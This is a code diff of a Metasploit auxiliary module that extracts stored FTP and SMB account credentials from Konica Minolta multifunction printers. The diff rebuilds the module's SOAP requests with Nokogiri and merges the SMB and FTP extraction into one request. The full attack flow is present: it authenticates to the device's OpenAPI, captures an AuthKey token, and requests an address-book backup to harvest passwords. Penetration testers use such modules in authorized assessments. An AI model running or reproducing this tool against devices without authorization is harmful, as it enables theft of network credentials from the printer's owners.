@@ -1,5 +1,5 @@
-##
-# This module requires Metasploit: http//metasploit.com/download
+#
+# This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
@@ -17,7 +17,7 @@ class Metasploit3 < Msf::Auxiliary
       'Description' => %q(
         This module will extract FTP and SMB account usernames and passwords
         from Konica Minolta mfp devices. Tested models include: C224, C280,
-        283, C353, C360, 363, 420, C452,C452, C452, C454e ),
+        283, C353, C360, 363, 420, C452,C452, C452, C454e, C554 ),
       'Author'      =>
         [
           'Deral "Percentx" Heiland',
@@ -40,67 +40,79 @@ class Metasploit3 < Msf::Auxiliary
   def generate_authkey_request_xlm(major, minor)
     user = datastore['USER']
     passwd = datastore['PASSWD']
-    xmlauthreq = '<SOAP-ENV:Envelope'
-    xmlauthreq << "\nxmlns:SOAP-ENV='http://schemas.xmlsoap.org/soap/envelope/'"
-    xmlauthreq << "\nxmlns:SOAP-ENC='http://schemas.xmlsoap.org/soap/encoding/'"
-    xmlauthreq << "\nxmlns:xsi='http://www.w3.org/2001/XMLSchema-instance'"
-    xmlauthreq << "\nxmlns:xsd='http://www.w3.org/2001/XMLSchema'>"
-    xmlauthreq << '<SOAP-ENV:Header>'
-    xmlauthreq << '<me:AppReqHeader'
-    xmlauthreq << "\nxmlns:me='http://www.konicaminolta.com/Header/OpenAPI-#{major}-#{minor}'>"
-    xmlauthreq << "<ApplicationID xmlns=''>0</ApplicationID>"
-    xmlauthreq << "<UserName xmlns=''></UserName>"
-    xmlauthreq << "<Password xmlns=''></Password>"
-    xmlauthreq << "<Version xmlns=''>"
-    xmlauthreq << "<Major>#{major}</Major>"
-    xmlauthreq << "<Minor>#{minor}</Minor>"
-    xmlauthreq << '</Version>'
-    xmlauthreq << "<AppManagementID xmlns=''>0</AppManagementID>"
-    xmlauthreq << '</me:AppReqHeader>'
-    xmlauthreq << '</SOAP-ENV:Header>'
-    xmlauthreq << '<SOAP-ENV:Body>'
-    xmlauthreq << "<AppReqLogin xmlns='http://www.konicaminolta.com/service/OpenAPI-#{major}-#{minor}'>"
-    xmlauthreq << '<OperatorInfo>'
-    xmlauthreq << "<UserType>#{user}</UserType>"
-    xmlauthreq << "<Password>#{passwd}</Password>"
-    xmlauthreq << '</OperatorInfo>'
-    xmlauthreq << '<TimeOut>60</TimeOut>'
-    xmlauthreq << '</AppReqLogin>'
-    xmlauthreq << '</SOAP-ENV:Body>'
-    xmlauthreq << '</SOAP-ENV:Envelope>'
+    Nokogiri::XML::Builder.new do |xml|
+      xml.send('SOAP-ENV:Envelope',
+               'xmlns:SOAP-ENV' => 'http://schemas.xmlsoap.org/soap/envelope/',
+               'xmlns:SOAP-ENC' => 'http://schemas.xmlsoap.org/soap/encoding/',
+               'xmlns:xsi' => 'http://www.w3.org/2001/XMLSchema-instance',
+               'xmlns:xsd' => 'http://www.w3.org/2001/XMLSchema'){
+        xml.send('SOAP-ENV:Header'){
+          xml.send('me:AppReqHeader', 'xmlns:me' => "http://www.konicaminolta.com/Header/OpenAPI-#{major}-#{minor}"){
+            xml.send('ApplicationID', 'xmlns' => '') { xml.text '0' }
+            xml.send('UserName', 'xmlns' => '') { xml.text '' }
+            xml.send('Password', 'xmlns' => '') { xml.text '' }
+            xml.send('Version', 'xmlns' => ''){
+              xml.send('Major') { xml.text "#{major}" }
+              xml.send('Minor') { xml.text "#{minor}" }
+            }
+            xml.send('AppManagementID', 'xmlns' => '') { xml.text '0' }
+          }
+        }
+        xml.send('SOAP-ENV:Body') {
+          xml.send('AppReqLogin', 'xmlns' => "http://www.konicaminolta.com/service/OpenAPI-#{major}-#{minor}"){
+            xml.send('OperatorInfo'){
+              xml.send('UserType') { xml.text "#{user}" }
+              xml.send('Password') { xml.text "#{passwd}" }
+            }
+            xml.send('TimeOut') { xml.text '60' }
+          }
+        }
+      }
+    end
   end
 
-  # Create XML data that will be sent to extract SMB passwords for devices
-  def generate_smbpwd_request_xlm(major, minor, authkey)
-    xmlsmbreq = '<SOAP-ENV:Envelope'
-    xmlsmbreq << "\nxmlns:SOAP-ENV='http://schemas.xmlsoap.org/soap/envelope/'"
-    xmlsmbreq << "\nxmlns:SOAP-ENC='http://schemas.xmlsoap.org/soap/encoding/'"
-    xmlsmbreq << "\nxmlns:xsi='http://www.w3.org/2001/XMLSchema-instance'"
-    xmlsmbreq << "\nxmlns:xsd='http://www.w3.org/2001/XMLSchema'>"
-    xmlsmbreq << '<SOAP-ENV:Header><me:AppReqHeader'
-    xmlsmbreq << "\nxmlns:me='http://www.konicaminolta.com/Header/OpenAPI-#{major}-#{minor}'>"
-    xmlsmbreq << "<ApplicationID xmlns=''>0</ApplicationID>"
-    xmlsmbreq << "<UserName xmlns=''></UserName>"
-    xmlsmbreq << "<Password xmlns=''></Password>"
-    xmlsmbreq << "<Version xmlns=''><Major>#{major}</Major>"
-    xmlsmbreq << "<Minor>#{minor}</Minor></Version>"
-    xmlsmbreq << "<AppManagementID xmlns=''>1000</AppManagementID>"
-    xmlsmbreq << '</me:AppReqHeader></SOAP-ENV:Header>'
-    xmlsmbreq << "<SOAP-ENV:Body><AppReqGetAbbr xmlns='http://www.konicaminolta.com/service/OpenAPI-#{major}-#{minor}'>"
-    xmlsmbreq << '<OperatorInfo>'
-    xmlsmbreq << "<AuthKey>#{authkey}</AuthKey>"
-    xmlsmbreq << '</OperatorInfo><AbbrListCondition>'
-    xmlsmbreq << '<SearchKey>None</SearchKey>'
-    xmlsmbreq << '<WellUse>false</WellUse>'
-    xmlsmbreq << '<ObtainCondition>'
-    xmlsmbreq << '<Type>OffsetList</Type>'
-    xmlsmbreq << '<OffsetRange><Start>1</Start><Length>100</Length></OffsetRange>'
-    xmlsmbreq << '</ObtainCondition>'
-    xmlsmbreq << '<BackUp>true</BackUp>'
-    xmlsmbreq << '<BackUpPassword>MYSKIMGS</BackUpPassword>'
-    xmlsmbreq << '</AbbrListCondition></AppReqGetAbbr>'
-    xmlsmbreq << '</SOAP-ENV:Body>'
-    xmlsmbreq << '</SOAP-ENV:Envelope>'
+  # Create XML data that will be sent to extract SMB and FTP passwords from device
+  def generate_pwd_request_xlm(major, minor, authkey)
+    Nokogiri::XML::Builder.new do |xml|
+      xml.send('SOAP-ENV:Envelope',
+               'xmlns:SOAP-ENV' => 'http://schemas.xmlsoap.org/soap/envelope/',
+               'xmlns:SOAP-ENC' => 'http://schemas.xmlsoap.org/soap/encoding/',
+               'xmlns:xsi' => 'http://www.w3.org/2001/XMLSchema-instance',
+               'xmlns:xsd' => 'http://www.w3.org/2001/XMLSchema'){
+        xml.send('SOAP-ENV:Header'){
+          xml.send('me:AppReqHeader', 'xmlns:me' => "http://www.konicaminolta.com/Header/OpenAPI-#{major}-#{minor}"){
+            xml.send('ApplicationID', 'xmlns' => '') { xml.text '0' }
+            xml.send('UserName', 'xmlns' => '') { xml.text '' }
+            xml.send('Password', 'xmlns' => '') { xml.text '' }
+            xml.send('Version', 'xmlns' => ''){
+              xml.send('Major') { xml.text "#{major}" }
+              xml.send('Minor') { xml.text "#{minor}" }
+            }
+            xml.send('AppManagementID', 'xmlns' => '') { xml.text '1000' }
+          }
+        }
+        xml.send('SOAP-ENV:Body'){
+          xml.send('AppReqGetAbbr', 'xmlns' => "http://www.konicaminolta.com/service/OpenAPI-#{major}-#{minor}"){
+            xml.send('OperatorInfo'){
+              xml.send('AuthKey') { xml.text "#{authkey}" }
+            }
+            xml.send('AbbrListCondition'){
+              xml.send('SearchKey') { xml.text 'None' }
+              xml.send('WellUse') {  xml.text 'false' }
+              xml.send('ObtainCondition'){
+                xml.send('Type') { xml.text 'OffsetList' }
+                xml.send('OffsetRange'){
+                  xml.send('Start') { xml.text '1' }
+                  xml.send('Length') { xml.text '100' }
+                }
+              }
+              xml.send('BackUp') { xml.text 'true' }
+              xml.send('BackUpPassword') { xml.text 'MYSKIMGS' }
+            }
+          }
+        }
+      }
+    end
   end
 
   # This next section will post the XML soap messages for information gathering.
@@ -129,21 +141,20 @@ class Metasploit3 < Msf::Auxiliary
       login(major, minor)
     end
 
-    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Rex::ConnectionError
+    rescue ::Rex::ConnectionError
       print_error("#{peer} - Version check Connection failed.")
   end
 
   # This section logs on and retrieves AuthKey token
   def login(major, minor)
     authreq_xml = generate_authkey_request_xlm(major, minor)
-
     # Send post request with crafted XML to login and retreive AuthKey
     begin
       response = send_request_cgi(
       {
         'uri'    => '/',
         'method' => 'POST',
-        'data'   => "#{authreq_xml}"
+        'data'   => authreq_xml.to_xml
       }, datastore['TIMEOUT'].to_i)
       if response.nil?
         print_error("#{peer} - No reponse from device")
@@ -154,7 +165,7 @@ class Metasploit3 < Msf::Auxiliary
         authkey = ("#{authkey_parse}")
         extract(major, minor, authkey)
       end
-    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Rex::ConnectionError
+    rescue ::Rex::ConnectionError
       print_error("#{peer} - Login Connection failed.")
     end
   end
@@ -163,15 +174,14 @@ class Metasploit3 < Msf::Auxiliary
   def extract(major, minor, authkey)
     if (authkey != '')
       # create xml request to extract user credintial settings
-      smbreq_xml = generate_smbpwd_request_xlm(major, minor, authkey)
-
+      smbreq_xml = generate_pwd_request_xlm(major, minor, authkey)
       # Send post request with crafted XML as data
       begin
         response = send_request_cgi(
         {
           'uri'    => '/',
           'method' => 'POST',
-          'data'   => "#{smbreq_xml}"
+          'data'   => smbreq_xml.to_xml
         }, datastore['TIMEOUT'].to_i)
         if response.nil?
           print_error("#{peer} - No reponse from device")
